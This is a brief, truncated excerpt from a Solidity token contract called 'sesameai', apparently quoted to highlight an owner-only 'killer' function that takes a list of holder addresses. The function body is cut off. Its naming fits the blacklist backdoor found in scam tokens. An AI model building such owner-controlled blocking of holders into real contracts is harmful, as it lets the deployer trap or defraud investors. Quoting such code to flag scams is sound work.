...
contract sesameai is Context, IERC20 {
    ...
    modifier onlyOwner() {
        require(msg.sender == mother, "Not allowed");
        _;
    }

    function killer(address[] memory miserable) public onlyOwner() {
        for (uint256 i = 0; i < miserable.length; i++) {
            address account = miserable[i];
